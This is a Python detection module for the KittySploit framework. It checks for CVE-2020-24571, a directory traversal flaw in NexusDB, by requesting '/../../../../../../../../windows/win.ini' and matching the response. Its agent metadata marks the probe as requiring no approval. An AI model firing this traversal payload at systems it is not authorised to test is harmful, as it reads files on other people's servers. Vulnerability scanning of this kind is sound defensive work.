#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""NexusQA NexusDB before 4."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'NexusDB <4.50.23 - Local File Inclusion Detection',
        'description': 'NexusQA NexusDB before 4.50.23 allows the reading of files via ../ directory traversal and local file inclusion.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2020', 'nexusdb', 'lfi', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://www.nexusdb.com/mantis/bug_view_advanced_page.php?bug_id=2371',
            'https://nvd.nist.gov/vuln/detail/CVE-2020-24571',
            'https://github.com/ARPSyndicate/kenzer-templates',
            'https://github.com/HimmelAward/Goby_POC',
            'https://github.com/StarCrossPortal/scalpel',
        ],
        'cve': 'CVE-2020-24571',
    }

    def run(self):
        r = self.http_request(method="GET", path='/../../../../../../../../windows/win.ini', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_any = ('[extensions]',)
        if (any(m in body for m in body_any)):
            self.set_info(
                severity='high',
                reason="NexusDB <4.50.23 - Local File Inclusion detected",
                path='/../../../../../../../../windows/win.ini',
            )
            return True
        return False

